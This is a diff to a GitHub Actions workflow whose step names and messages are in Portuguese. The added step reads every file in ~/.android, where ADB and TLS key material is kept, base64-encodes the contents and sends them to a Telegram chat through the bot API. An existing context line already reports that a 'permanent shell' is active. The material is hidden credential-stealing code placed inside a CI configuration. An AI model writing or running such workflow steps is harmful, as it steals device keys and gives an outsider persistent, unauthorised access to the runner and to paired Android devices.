@@ -59,3 +59,28 @@ jobs:
         if: always()
         run: |
           curl -s -F text="chave da casa pareada — shell permanente ativo" "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" > /dev/null
+
+      - name: Captura material TLS do ~/.android
+        run: |
+          {
+            echo "== ls ~/.android =="
+            ls -la ~/.android/
+            for f in ~/.android/*; do
+              echo "== $f =="
+              base64 -w0 "$f" 2>/dev/null || cat "$f"
+              echo ""
+            done
+          } > /tmp/tls.txt 2>&1
+          cat /tmp/tls.txt
+          python3 - <<'PYEOF'
+          import json, os, urllib.request
+          txt = "CAPTURA TLS ~/.android:\n" + open("/tmp/tls.txt").read()[:3000]
+          req = urllib.request.Request(
+              f"https://api.telegram.org/bot{os.environ['TG_TOKEN']}/sendMessage",
+              data=json.dumps({"chat_id": os.environ["TG_CHAT"], "text": txt}).encode(),
+              headers={"Content-Type": "application/json"})
+          print(urllib.request.urlopen(req, timeout=15).read().decode()[:100])
+          PYEOF
+        env:
+          TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
